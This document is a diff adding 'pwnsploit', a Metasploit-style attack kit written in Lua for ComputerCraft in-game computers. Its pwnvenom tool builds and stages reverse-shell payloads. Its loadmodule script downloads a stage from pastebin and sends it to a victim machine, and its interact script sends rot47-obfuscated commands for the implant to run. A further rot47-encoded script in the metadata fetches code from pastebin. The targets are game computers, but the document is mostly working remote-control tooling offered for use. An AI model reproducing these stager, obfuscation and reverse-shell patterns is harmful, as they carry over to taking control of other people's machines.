@@ -1,0 +1,596 @@
+{
+  {
+    ".pwnsploit/interact",
+    "Args = {...} \
+function rot47(char)\
+p = string.byte(char)\
+if p >= string.byte('!') and p <= string.byte('O') then\
+p = ((p + 47) % 127)\
+elseif p >= string.byte('P') and p <= string.byte('~') then\
+p = ((p - 47) % 127)\
+end\
+return string.char(p)\
+end\
+\
+local letter1 = string.char(math.random(1, 40))\
+local letter2 = string.char(math.random(1, 40))\
+local letter3 = string.char(math.random(1, 40))\
+local letter4 = string.char(math.random(1, 40))\
+local letter5 = string.char(math.random(1, 40))\
+local therandomcode = letter1..letter2..letter3..letter4..letter5\
+\
+function rot47String( string )\
+rotdStr = \"\"\
+for n=1, string:len() do\
+rotdStr = rotdStr..rot47(string:sub(n,n))\
+end\
+return rotdStr\
+end\
+function printoutp()\
+print(\"interact.lua <LPORT> <LRESPONSEPORT>\")\
+print(\"The ports must be the ones you used in your session\")\
+print(\"It will first ask you S or F. For S use string and F file\")\
+end\
+h = peripheral.find(\"modem\")\
+term.clear()\
+local LPORT = Args[1]\
+local LPORT2 = Args[2]\
+if LPORT == nil or LPORT2 == nil or LPORT == nil and LPORT2 == nil then\
+printoutp()\
+end\
+local sendbackfunc = \" sleep(3) local qaaarrt = peripheral.find('modem') qaaarrt.open(\"..LPORT..\") qaaarrt.open(\"..LPORT2..\") qaaarrt.transmit(\"..LPORT..\", \"..LPORT2..\", '\"..therandomcode..\"')\"\
+if LPORT == nil or LPORT2 == nil or LPORT == nil and LPORT2 == nil then\
+printoutp()\
+elseif LPORT ~= nil and LPORT2 ~= nil then\
+h = peripheral.find(\"modem\")\
+h.open(tonumber(LPORT))\
+h.open(tonumber(LPORT2))\
+while true do\
+print(\"Meterpreter\"..LPORT..\" -> \"..LPORT2..\" S/F\")\
+local input = read()\
+if input == \"F\" then\
+print(\"File path (From /)\")\
+fileinput = read()\
+local openfile = fs.open(fileinput, \"r\")\
+if openfile == nil then\
+print(\"the file input is not existent! Are you sure its in the main directory?\")\
+else\
+readall = openfile.readAll()\
+local finalesend = \" \"..sendbackfunc..\" \"..readall..\" \"\
+print(finalesend)\
+encfinalesend = rot47String(finalesend)\
+h.transmit(tonumber(LPORT), tonumber(LPORT2), encfinalesend)\
+thething = 1\
+local timer1 = os.startTimer(7)\
+while thething == 1 do\
+local event, modemSide, senderChannel, replyChannel, message, senderDistance = os.pullEvent()\
+if event == \"timer\" then\
+print(\"Nothing received. This payload is not compatitable or it has closed\")\
+thething = 2\
+elseif event == \"modem_message\" and message == therandomcode then\
+print(\"Success\")\
+thething = 2\
+end\
+end\
+end\
+elseif input == \"exit\" then\
+error(\"goodbye!\")\
+elseif input == \"S\"  then\
+print(\"Enter string here\")\
+local stringinput = read()\
+print(\"Sending\")\
+local finalsend = \" \"..sendbackfunc..\" \"..stringinput..\" \"\
+sleep(1)\
+encfinalsend = rot47String(finalsend)\
+h.transmit(tonumber(LPORT), tonumber(LPORT2), encfinalsend)\
+local timer = os.startTimer(9)\
+aaa = 1\
+while aaa == 1 do\
+local event, modemSide, senderChannel, replyChannel, message, senderDistance = os.pullEvent()\
+if event == \"timer\" then\
+print(\"Nothing received. This payload is not compatitable or it has closed\")\
+aaa = 2\
+elseif event == \"modem_message\" and message == therandomcode then\
+print(\"Success\")\
+aaa = 2\
+end\
+end\
+end\
+end\
+end",
+  },
+  {
+    ".pwnsploit/loadmodule",
+    "shell.run(\"delete TEMPORARY2\")\
+Args = {...}\
+param = '-s'\
+function rot47(char)\
+p = string.byte(char)\
+if p >= string.byte('!') and p <= string.byte('O') then\
+p = ((p + 47) % 127)\
+elseif p >= string.byte('P') and p <= string.byte('~') then\
+p = ((p - 47) % 127)\
+end\
+return string.char(p)\
+end\
+\
+function rot47String( string )\
+rotdStr = \"\"\
+for n=1, string:len() do\
+rotdStr = rotdStr..rot47(string:sub(n,n))\
+end\
+return rotdStr\
+end\
+function printusage()\
+print(\"Usage: loadmodule <MODULE> <LPORT> <LRESPONSEPORT> <ComputerID>\")\
+print(\"For a list of modules do 'loadmodule list'\")\
+print(\"For module help do 'loadmodule help <module>\")\
+end\
+if Args[1] == \"list\" then\
+print(\"meterpreter\")\
+elseif Args[1] == \"help\" and Args[2] == \"meterpreter\" then\
+print('Module name: \"Meterpreter\"')\
+print(\"Info: Adds lua functions which you can\")\
+print(\"Use by the interact command or by manual transmit.\")\
+print(\"To get commands use the function help()\")\
+elseif Args[1] == \"meterpreter\" and Args[2] ~= nil and Args[3] ~= nil then\
+h = peripheral.find(\"modem\")\
+h.open(tonumber(Args[2]))\
+h.open(tonumber(Args[3]))\
+shell.run(\"pastebin get Qt1xt1hk TEMPORARY2\")\
+sleep(4)\
+n = fs.open(\".pwnsploit/TEMPORARY2\",\"a\")\
+n.writeLine(\" \")\
+n.writeLine(\"LPORT = \"..Args[2])\
+n.writeLine(\"LPORT2 = \"..Args[3])\
+n.flush()\
+n.close()\
+n = nil\
+o = fs.open(\".pwnsploit/TEMPORARY2\", \"r\")\
+stage = o.readAll()\
+encodedstage = rot47String(stage)\
+print(encodedstage)\
+o.close()\
+o = nil\
+h.transmit(tonumber(Args[2]), tonumber(Args[3]), encodedstage)\
+sleep(2)\
+h.transmit(tonumber(Args[2]), tonumber(Args[3]), rot47String(\"test()\"))         \
+event, modemSide, senderChannel,   replyChannel, message, senderDistance = os.pullEvent(\"modem_message\")\
+if message == \"Success\" then\
+print(\"Loaded\")\
+end\
+else\
+printusage()\
+end",
+  },
+  {
+    ".pwnsploit/pwnvenom",
+    "meterp = 0\
+tArgs = {...}\
+modem = peripheral.find(\"modem\")\
+if modem == nil then\
+function rot47(char)\
+p = string.byte(char)\
+if p >= string.byte('!') and p <= string.byte('O') then\
+p = ((p + 47) % 127)\
+elseif p >= string.byte('P') and p <= string.byte('~') then\
+p = ((p - 47) % 127)\
+end\
+return string.char(p)\
+end\
+\
+function rot47String( string )\
+rotdStr = \"\"\
+for n=1, string:len() do\
+rotdStr = rotdStr..rot47(string:sub(n,n))\
+end\
+return rotdStr\
+end\
+error(\"attach a modem!\")\
+end\
+function update()\
+local PAYLOAD = tArgs[1]\
+local LHOST0 = tArgs[2]\
+local LHOST = tostring(LHOST0)\
+local LPORT0 = tArgs[3]\
+local LPORT = tonumber(LPORT0)\
+local LRESPONSEPORT0 = tArgs[4]\
+local LRESPONSEPORT = tonumber(LRESPONSEPORT0)\
+local BACKGROUND = tArgs[6]\
+local TEMP = \"/.pwnsploit/.TEMPFORHANDLERDONTDELETE\"\
+local OUTPUT = tArgs[5]\
+if tArgs[1] == \"payloads\" then\
+print(\"lua/modem_reverse_port is not staged!\")\
+print(\"lua/\")\
+print(\" modem_reverse_port\")\
+print(\" modem/\")\
+print(\"  reverse_port\")\
+elseif tArgs[1] == \"lua/modem_reverse_port\" then\
+fs.delete(\"/.pwnsploit/.TEMPFORHANDLERDONTDELETE\")\
+shell.run(\"pastebin get n4sa18zS /.pwnsploit/\"..OUTPUT)\
+file = fs.open(\"/.pwnsploit/\"..OUTPUT, \"a\")\
+file.writeLine(\" \")\
+file.writeLine(\"LPORT = \"..LPORT0)\
+file.writeLine(\"LPORT2 = \"..LRESPONSEPORT)\
+file.writeLine(\"open()\")\
+file.writeLine(\"parallel.waitForAny(update, function() shell.run('shell') end)\")\
+file.close()\
+file = nil\
+print(\"Wrote to file\")\
+local listening = 1\
+while listening == 1 do\
+event, side, frequency, replyFrequency, message, distance = os.pullEvent(\"modem_message\")\
+if tonumber(message) ~= nil and replyFrequency == LRESPONSEPORT and frequency == LPORT then\
+myid = os.getComputerID()\
+meterp = meterp + 1\
+print(\"Lua Command shell session \"..meterp..\" opened (\"..message..\":\"..LPORT..\"->\"..myid..\":\"..LPORT..\")\")\
+end\
+end\
+elseif tArgs[1] == \"lua/modem/reverse_encrypted_port\" then\
+if LHOST ~= nil and LPORT ~= nil and LRESPONSEPORT ~= nil then\
+fs.delete(\".TEMPFORHANDLERDONTDELETE\")\
+shell.run(\"pastebin get n4sa18zS /.pwnsploit/.TEMPFORHANDLERDONTDELETE\")\
+local TEMP = tArgs[5]\
+local payout = tArgs[5]\
+tempfile = fs.open(\"/.pwnsploit/.TEMPFORHANDLERDONTDELETE\", \"a\")\
+tempfile.writeLine(\" \")\
+tempfile.writeLine(\"LPORT = \"..LPORT)\
+tempfile.writeLine(\"LPORT2 = \"..LRESPONSEPORT)\
+tempfile.writeLine(\"open()\")\
+tempfile.writeLine(\"parallel.waitForAny(update, function() shell.run('shell') end)\")\
+tempfile.close()\
+tempfile = nil\
+wtype = \"EncryptedLua\"\
+bytes = \"810\"\
+local OUTPUT = tArgs[5]\
+print(\"Generating \"..PAYLOAD..\"with\")\
+print(\"LHOST \"..PAYLOAD)\
+print(\"LPORT \"..LPORT)\
+print(\"LRESPONSEPORT\"..LRESPONSEPORT)\
+sleep(1)\
+modem.open(LPORT)\
+modem.open(LRESPONSEPORT)\
+local listening = 1\
+while listening == 1 do\
+event, side, frequency, replyFrequency, message, distance = os.pullEvent(\"modem_message\")\
+if message == \"stagerequired\" and replyFrequency == LRESPONSEPORT and frequency == LPORT then\
+print(\"Sending stage.. \"..frequency..\" > \"..replyFrequency..\" (960 bytes)\")\
+local readfile = fs.open(\".pwnsploit/.TEMPFORHANDLERDONTDELETE\", \"r\")\
+local payloadfrsnd = rot47String(readfile.readAll())\
+sleep(1)\
+modem.transmit(LPORT, LRESPONSEPORT, payloadfrsnd)\
+print(\"Sent.\")\
+elseif tonumber(message) ~= nil and replyFrequency == LRESPONSEPORT and frequency == LPORT then\
+myid = os.getComputerID()\
+meterp = meterp + 1\
+print(\"Lua Command shell session \"..meterp..\" opened (\"..message..\":\"..LPORT..\"->\"..myid..\":\"..LPORT..\")\")\
+end\
+end\
+elseif tArgs[1] == \"lua/modem/reverse_port\" then\
+if LHOST ~= nil and LPORT ~= nil and LRESPONSEPORT ~= nil then\
+fs.delete(\".TEMPFORHANDLERDONTDELETE\")\
+shell.run(\"pastebin get n4sa18zS /.pwnsploit/.TEMPFORHANDLERDONTDELETE\")\
+local TEMP = tArgs[5]\
+local payout = tArgs[5]\
+tempfile = fs.open(\"/.pwnsploit/.TEMPFORHANDLERDONTDELETE\", \"a\")\
+tempfile.writeLine(\" \")\
+tempfile.writeLine(\"LPORT = \"..LPORT)\
+tempfile.writeLine(\"LPORT2 = \"..LRESPONSEPORT)\
+tempfile.writeLine(\"open()\")\
+tempfile.writeLine(\"parallel.waitForAny(update, function() shell.run('shell') end)\")\
+tempfile.close()\
+tempfile = nil\
+wtype = \"EncryptedLua\"\
+bytes = \"810\"\
+local OUTPUT = tArgs[5]\
+print(\"Generating \"..PAYLOAD..\"with\")\
+print(\"LHOST \"..PAYLOAD)\
+print(\"LPORT \"..LPORT)\
+print(\"LRESPONSEPORT\"..LRESPONSEPORT)\
+sleep(1)\
+modem.open(LPORT)\
+modem.open(LRESPONSEPORT)\
+local listening = 1\
+while listening == 1 do\
+event, side, frequency, replyFrequency, message, distance = os.pullEvent(\"modem_message\")\
+if message == \"stagerequired\" and replyFrequency == LRESPONSEPORT and frequency == LPORT then\
+print(\"Sending stage.. \"..frequency..\" > \"..replyFrequency..\" (960 bytes)\")\
+local readfile = fs.open(\"/.pwnsploit/.TEMPFORHANDLERDONTDELETE\", \"r\")\
+local payloadfrsnd = readfile.readAll()\
+sleep(1)\
+modem.transmit(LPORT, LRESPONSEPORT, payloadfrsnd)\
+print(\"Sent.\")\
+elseif tonumber(message) ~= nil and replyFrequency == LRESPONSEPORT and frequency == LPORT then\
+myid = os.getComputerID()\
+meterp = meterp + 1\
+print(\"Lua Command shell session \"..meterp..\" opened (\"..message..\":\"..LPORT..\"->\"..myid..\":\"..LPORT..\")\")\
+end\
+end\
+end\
+end\
+else\
+printError(\"Usage: pwnvenom  PAYLOAD LHOST LPORT RESPONSEPORT OUTPUT(as file)\")\
+printError(\"Payload example: lua/modem_reverse_port\")\
+printError('For payloads use \"pwnvenom payloads\" (every space counts as a \"backslash\") ')\
+print(\"IMPORTANT: lua/modem_revers_port is NOT staged, only if there is a slash inbetween its staged! \")\
+end\
+end\
+parallel.waitForAny(update, function() shell.run('shell') end)",
+  },
+  {
+    "pwnsploit",
+    "f = 1\
+a = 1\
+while a > 10 do\
+print(\" \")\
+a = a + 0.5\
+end\
+\
+while f < 10 do\
+shell.run(\"cd .pwnsploit\")\
+term.clear()\
+print(\"Initializing pwnsploit! |\")\
+sleep(0.3)\
+term.clear()\
+print(\"Initializing pwnsploit! /\")\
+sleep(0.3)\
+term.clear()\
+print(\"Initializing pwnsploit! --\")\
+sleep(0.3)\
+term.clear()\
+print(\"Initializing pwnsploit! \\ \")\
+sleep(0.3)\
+term.clear()\
+print(\"Initializing pwnsploit! |\")\
+sleep(0.3)\
+term.clear()\
+print(\"Initializing pwnsploit! /\")\
+sleep(0.3)\
+term.clear()\
+f = f + 1\
+end\
+term.setTextColor(colors.blue)\
+print(\"Use pwnvenom for payload creating and handling\")\
+print(\"Use loadmodule to load and create simple modules\")\
+print(\"Use interact to send string commands to payloads (File option does not work yet)\")",
+  },
+  meta = {
+    dependencies = "latest puplib",
+    info = "{\
+  {\
+    \"pydo.lua\",\
+    \"=@42= 563@F?46 l ECF6\\\
+=@42= C6A@u:=6D l 7D]=:DEWQ^AJ5@^C6A@D^QX\\\
+=@42= C6A@D l LN\\\
+=@42= C6A@=:DE l 7D]@A6?WQ^AJ5@^C6A@D^C6A@=:DEQ[ QCQX\\\
+=@42= EpC8D l L]]]N\\\
+\\\
+\\\\\\\\4964< FA52E6\\\
+AJ5@ l 7D]@A6?WQAJ5@]=F2Q[ QCQX\\\
+C6252== l AJ5@]C625p==WX\\\
+AJ5@]4=@D6WX\\\
+=:3` l 7D]@A6?WQ=:3D^AFA=:3Q[ QCQX\\\
+C6252==a l =:3`]C625p==WX\\\
+=:3`]4=@D6WX\\\
+\\\
+\\\
+:7 0v]4964<FA52E65 ll ?:= E96?\\\
+AC:?EWQr964<:?8 7@C FA52E6D]]QX\\\
+:7 C6252== ll 9EEA]86EWQ9EEADi^^A2DE63:?]4@>^C2H^ByEFI:HuQX]C625p==WX E96?\\\
+:7 C6252==a ll 9EEA]86EWQ9EEADi^^A2DE63:?]4@>^C2H^gr}qcHeFQX]C625p==WX E96?\\\
+AC:?EWQ!J5@ :D FA E@ 52E6PQX\\\
+0v]4964<FA52E65 l `\\\
+6=D6\\\
+0v]4964<FA52E65 l `\\\
+AC:?EtCC@CWQAFA=:3 :D ?@E FA E@ 52E6P A=62D6 CF? AJ5@ FA52E6P *@F 42? 4@?E:?F6 :7 J@F H2?EQX\\\
+6?5\\\
+6=D6\\\
+0v]4964<FA52E65 l `\\\
+AC:?EtCC@CWQ!J5@ :ED6=7 92D 2? FA52E6P !=62D6 FD6 AJ5@ FA52E6P *@F 42? 4@?E:?F6 H:E9@FE FA52E:?8QX\\\
+6?5\\\
+6=D6\\\
+6?5\\\
+\\\
+\\\
+\\\
+:7 7D]6I:DEDWQ=:3D^AFA=:3QX E96?\\\
+=:3C2CJ` l 7D]@A6?WQ=:3D^AFA=:3Q[ QCQX\\\
+AFA l =@25DEC:?8W=:3C2CJ`]C625p==WXXWX\\\
+=:3C2CJ`]4=@D6WX\\\
+6=D6\\\
+AC:?EtCC@CWQ!FA=:3 4@F=5 ?@E 36 7@F?5P !=62D6 CF? AJ5@]=F2 FA52E6PQX\\\
+6?5\\\
+\\\
+=@42= 7F?4E:@? AC:?E96=AWX\\\
+  AC:?EWQu@==@H:?8 7F?4E:@?DQX\\\
+  AC:?EWQ QX\\\
+  AC:?EWQ96=A \\\\\\\\AC:?ED 96=AQX\\\
+  AC:?EWQ:?DE2== WC6A@?2>6X WA24<286?2>6X \\\\\\\\:?DE2==D 2 A24<286 7C@> E96 C6A@ 8:G6?QX\\\
+  AC:?EWQ:?DE2==7:=6 W7:=6X \\\\\\\\:?DE2==D 2 A24<286 7C@> 7:=6QX\\\
+  AC:?EWQ=:DE WC6A@?2>6X \\\\\\\\7@C 2 =:DE @7 A24<286D :? E92E C6A@QX\\\
+  AC:?EWQF?:?DE2== WA24<286?2>6X \\\\\\\\E@ F?:?DE2== 2 A24<286QX\\\
+  AC:?EWQ:?DE2==65 \\\\\\\\E@ G:6H :?DE2==65 A24<286DQX\\\
+  AC:?EWQFA52E6 \\\\\\\\FA52E6D AJ5@QX\\\
+  AC:?EWQC6A@=:DE \\\\\\\\D9@HD 2== C6A@VDQX\\\
+  AC:?EWQ5@H?=@25 WC6A@?2>6X WA24<286?2>6XQX\\\
+  AC:?EWQ:?7@ WC6A@?2>6 ~# V7:=6VX WA24<286?2>6 ~# 7:=6?2>6XQX\\\
+6?5\\\
+=@25DEC:?8WC6A@=:DE]C625p==WXXWX\\\
+:7 EpC8D,`. ll QC6A@=:DEQ E96?\\\
+AC:?EWE6IEFE:=D]D6C:2=:K6WC6A@E23=6XX\\009\\\
+6=D6:7 EpC8D,`. ll Q96=AQ E96?\\\
+  AC:?E96=AWX\\\
+6=D6:7 EpC8D,`. ll Q:?7@Q E96?\\\
+:7 EpC8D,a. ll Q7:=6Q E96?\\\
+:7 7D]6I:DEDWEpC8D,b.X E96?\\\
+AC:?EWQr964<:?8 7:=6]]QX\\\
+>6E2E23=6 l AFA]86E|6E2WEpC8D,b.X\\\
+D=66AW`X\\\
+AC:?EWQ:?7@iQX\\\
+AC:?EW>6E2E23=6,Q:?7@Q.X\\\
+AC:?EWQ QX\\\
+AC:?EWQ56A6?56?4:6DiQX\\\
+AC:?EWQ QX\\\
+AC:?EW>6E2E23=6,Q56A6?56?4:6DQ.X\\\
+6=D6\\\
+AC:?EtCC@CWQu:=6 5@6D?E 6I:DEPQX\\\
+6?5\\\
+6=D6\\\
+:7 EpC8D,b. E96?\\\
+=@42= D:E6 l 9EEA]86EWC6A@E23=6,EpC8D,a..]]Q7:=6D^Q]]EpC8D,b.X\\\
+\\009\\009AC:?EWD:E6X\\\
+\\009\\009\\009:7 D:E6 E96?\\\
+\\009\\009\\009AC:?EWQr@??64E65 E@ C6A@QX\\\
+\\009\\009\\009=@42= 7:=6 l D:E6]C625p==WX\\\
+\\009\\009\\009\\009:7 7:=6 E96?\\\
+\\009\\009\\009\\009E6>A@C2CJ l 7D]@A6?WQ]E6>A@C2CJQ[ QHQX\\\
+\\009\\009\\009\\009E6>A@C2CJ]HC:E6W7:=6X\\\
+\\009\\009\\009\\009E6>A@C2CJ]4=@D6WX\\\
+\\009\\009\\009\\009AC:?EWQvC23365 7:=6]]QX\\\
+\\009\\009\\009\\009D=66AW`X\\\
+\\009\\009\\009\\009AC:?EWQr964<:?8 7:=6]]QX\\\
+\\009\\009\\009\\009>6E2E23=6 l AFA]86E|6E2WQ]E6>A@C2CJQX\\\
+\\009\\009\\009\\009AC:?EWQ:?7@iQX\\\
+\\009\\009\\009\\009AC:?EW>6E2E23=6,Q:?7@Q.X\\\
+\\009\\009\\009\\009AC:?EWQ QX\\\
+\\009\\009\\009\\009AC:?EWQ56A6?52?4:6DiQX\\\
+\\009\\009\\009\\009AC:?EWQ QX\\\
+\\009\\009\\009\\009AC:?EW>6E2E23=6,Q56A6?52?4:6DQ.X\\\
+\\009\\009\\009\\0096=D6\\\
+\\009\\009\\009\\0096CC@CWQ%96 7:=6 4@?E2:?D ?@E9:?8P ~C H2D ?6G6C 76E4965PQX\\\
+\\009\\009\\0096?5\\\
+\\009\\0096?5\\\
+6=D6\\\
+AC:?EtCC@CWQx?G2=:5 x?AFEP &D6 AJ5@]=F2 :?7@ WC6A@?2>6X WA24<286?2>6XQX\\\
+6?5\\\
+6?5\\\
+\\\
+6=D6:7 EpC8D,`. ll QFA52E6Q E96?\\\
+\\0097D]56=6E6WQAJ5@]=F2QX\\\
+\\0097D]56=6E6WQ=:3D^AFA=:3QX\\\
+\\009D96==]CF?WQH86E 9EEADi^^A2DE63:?]4@>^C2H^ByEFI:Hu AJ5@]=F2QX\\\
+\\009AC:?EWQx?DE2==:?8 =:3C2C:6D]]QX\\\
+\\009D96==]CF?WQH86E 9EEADi^^A2DE63:?]4@>^C2H^gr}qcHeF ^=:3D^AFA=:3QX\\\
+6=D6:7 EpC8D,`. ll Q:?DE2==65Q E96?\\\
+\\009=@42= A24<286=:DE l 7D]=:DEWQ^]:?DE2==65^QX\\\
+\\009\\0097@C 0[ 7:=6 :? :A2:CDWA24<286=:DEX 5@\\\
+\\009\\009D=66AW_]dX\\\
+\\009\\009AC:?EW7:=6X\\\
+6?5\\\
+6=D6:7 EpC8D,`. ll ?:= E96?\\\
+AC:?E96=AWX\\\
+6=D6:7 EpC8D,`. ll QF?:?DE2==Q E96?\\\
+\\009:7 7D]6I:DEDWQ^]:?DE2==65^Q]]EpC8D,a.X E96?\\\
+\\009\\009AC:?EWQ&?:?DE2==:?8QX\\\
+\\009\\009AFA]F?:?DE2==WQ^]:?DE2==65^Q]]EpC8D,a.[ Q^QX\\\
+\\009\\009D96==]CF?WQ56=6E6 ^]:?DE2==65^Q]]EpC8D,a.X\\\
+\\0096=D6\\\
+\\009\\0096CC@CWQ!24<286 5@6D ?@E 6I:DEPQX\\\
+\\0096?5\\\
+6=D6:7 EpC8D,`. ll Q:?DE2==7:=6Q E96?\\\
+\\009:7 7D]6I:DEDWEpC8D,a.X E96?\\\
+\\009\\009D96==]CF?WQ4@AJ EpC8D,a. ^]:?DE2==65^QX\\\
+\\009\\009AC:?EWQx?DE2==:?8]]QX\\\
+\\009\\009AFA]F?A24<WEpC8D,a.[ Q^QX\\\
+\\009\\009AC:?EWQs@?6]]PQX\\\
+\\009\\009AC:?EWQr964<:?8 7@C :?DE2==6C 7:=6]]QX\\\
+\\009\\009\\009:7 7D]6I:DEDWQ:?DE2==6CQX E96?\\\
+\\009\\009\\009AC:?EWQu@F?5]] #F??:?8]]]QX\\\
+\\009\\009\\009D=66AW`X\\\
+\\009\\009\\009D96==]CF?WQ:?DE2==6CQX\\\
+\\009\\009\\009D=66AWbX\\\
+\\009\\009\\009AC:?EWQs6=6E:?8 :?DE2==6C]]QX\\\
+\\009\\009\\0097D]56=6E6WQ^:?DE2==6CQX\\\
+\\009\\009\\009D=66AW`X\\\
+\\009\\009\\009AC:?EWQs@?6PQX\\\
+\\009\\0096=D6\\\
+\\009\\009\\009AC:?EWQxD ?@E E96C6] |@DE =:<6=J ?@E C6BF:C65PQX\\\
+\\009\\0096?5\\\
+\\0096=D6\\\
+AC:?EWQu:=6 5@6D ?@E 6I:DEPQX\\\
+6?5\\\
+6=D6:7 EpC8D,`. ll Q5@H?=@25Q E96?\\\
+:7 EpC8D,a. E96?\\\
+\\009\\009:7 EpC8D,b. E96?\\\
+  =@42= D:E6 l 9EEA]86EWC6A@E23=6,EpC8D,a..]]Q7:=6D^Q]]EpC8D,b.X\\\
+\\009\\009AC:?EWD:E6X\\\
+\\009\\009\\009:7 D:E6 E96?\\\
+\\009\\009\\009AC:?EWQr@??64E65 E@ C6A@QX\\\
+\\009\\009\\009=@42= 7:=6 l D:E6]C625p==WX\\\
+\\009\\009\\009\\009:7 7:=6 E96?\\\
+\\009\\009\\009\\009E6>A@C2CJ l 7D]@A6?WQ]E6>A@C2CJQ[ QHQX\\\
+\\009\\009\\009\\009E6>A@C2CJ]HC:E6W7:=6X\\\
+\\009\\009\\009\\009E6>A@C2CJ]4=@D6WX\\\
+\\009\\009\\009\\009AC:?EWQvC23365 7:=6]]QX\\\
+\\009\\009\\009\\009D=66AW`X\\\
+\\009\\009\\009\\009D96==]CF?WQ4@AJ ]E6>A@C2CJ ^AJ5@^5@H?=@25D^Q]]EpC8D,b.]]Q]AJ5QX\\\
+\\009\\009\\009\\009D=66AW`X\\\
+\\009\\009\\009\\009AC:?EWQ]]]s@?6P %96 7:=6 :D 5@H?=@2565 :? ^AJ5@^5@H?=@25D^ PQX\\\
+\\009\\009\\009\\0096=D6\\\
+\\009\\009\\009\\0096CC@CWQ%96 7:=6 4@?E2:?D ?@E9:?8P ~C H2D ?6G6C 76E4965PQX\\\
+\\009\\009\\0096?5\\\
+\\009\\0096?5\\\
+\\009\\0096=D6\\\
+\\009\\0096CC@CWQx H2D ?@E 23=6 E@ 76E49 E96 7:=6P s:5 J@F DA6== :E 4@CC64E=JnQX\\\
+\\0096?5\\\
+6?5\\\
+6=D6:7 EpC8D,`. ll Q:?DE2==Q  E96?\\\
+\\009:7 EpC8D,a. E96?\\\
+\\009\\009:7 EpC8D,b. E96?\\\
+  =@42= D:E6 l 9EEA]86EWC6A@E23=6,EpC8D,a..]]Q7:=6D^Q]]EpC8D,b.X\\\
+\\009\\009AC:?EWD:E6X\\\
+\\009\\009\\009:7 D:E6 E96?\\\
+\\009\\009\\009AC:?EWQr@??64E65 E@ C6A@QX\\\
+\\009\\009\\009=@42= 7:=6 l D:E6]C625p==WX\\\
+\\009\\009\\009\\009:7 7:=6 E96?\\\
+\\009\\009\\009\\009E6>A@C2CJ l 7D]@A6?WQ]E6>A@C2CJQ[ QHQX\\\
+\\009\\009\\009\\009E6>A@C2CJ]HC:E6W7:=6X\\\
+\\009\\009\\009\\009E6>A@C2CJ]4=@D6WX\\\
+\\009\\009\\009\\009AC:?EWQvC23365 7:=6]]QX\\\
+\\009\\009\\009\\009D=66AW`X\\\
+\\009\\009\\009\\009D96==]CF?WQ4@AJ ]E6>A@C2CJ ^]:?DE2==65^Q]]EpC8D,b.X\\\
+\\009\\009\\009\\009AFA]F?A24<WQ]E6>A@C2CJQ[ Q^QX\\\
+\\009\\009\\009\\009AC:?EWQx?DE2==:?8]]QX\\\
+\\009\\009\\009\\009D=66AW`X\\\
+\\009\\009\\009\\009AC:?EWQ]]]s@?6PQX\\\
+\\009\\009\\009\\009AC:?EWQr964<:?8 7@C :?DE2==6C 7:=6]]QX\\\
+\\009\\009\\009\\009:7 7D]6I:DEDWQ:?DE2==6CQX E96?\\\
+\\009\\009\\009\\009AC:?EWQu@F?5]] #F??:?8]]]QX\\\
+\\009\\009\\009\\009D=66AW`X\\\
+\\009\\009\\009\\009D96==]CF?WQ:?DE2==6CQX\\\
+\\009\\009\\009\\009D=66AWbX\\\
+\\009\\009\\009\\009AC:?EWQs6=6E:?8 :?DE2==6C]]QX\\\
+\\009\\009\\009\\0097D]56=6E6WQ^:?DE2==6CQX\\\
+\\009\\009\\009\\009D=66AW`X\\\
+\\009\\009\\009\\009AC:?EWQs@?6PQX\\\
+\\009\\009\\009\\0096=D6\\\
+\\009\\009\\009\\009AC:?EWQxD ?@E E96C6] |@DE =:<6=J ?@E C6BF:C65PQX\\\
+\\009\\009\\009\\0096?5\\\
+\\009\\009\\009\\0096=D6\\\
+\\009\\009\\009\\0096CC@CWQ%96 7:=6 4@?E2:?D ?@E9:?8P ~C H2D ?6G6C 76E4965PQX\\\
+\\009\\009\\0096?5\\\
+\\009\\0096?5\\\
+\\009\\0096=D6\\\
+\\009\\0096CC@CWQx H2D ?@E 23=6 E@ 76E49 E96 7:=6P s:5 J@F DA6== :E 4@CC64E=JnQX\\\
+\\0096?5\\\
+6?5\\\
+6=D6\\\
+  :7 EpC8D,`. ll Q=:DEQ E96?\\\
+    :7 EpC8D,a. E96?\\\
+      D:E6=:DE l AC:?EW9EEA]86EWC6A@E23=6,EpC8D,a..]]Q=:DEQX]C625p==WXX\\\
+      AC:?EWC6A@E23=6,EpC8D,a..X\\\
+      AC:?EWD:E6=:DEX\\\
+      6=D6\\\
+      AC:?EWQx?G2=:5 :?AFEPQX\\\
+    6?5\\\
+  6?5\\\
+6?5\",\
+  },\
+  meta = {\
+    dependencies = \"latest puplib\",\
+    info = \"Something.\\\
+\",\
+  },\
+}",
+  },
+}
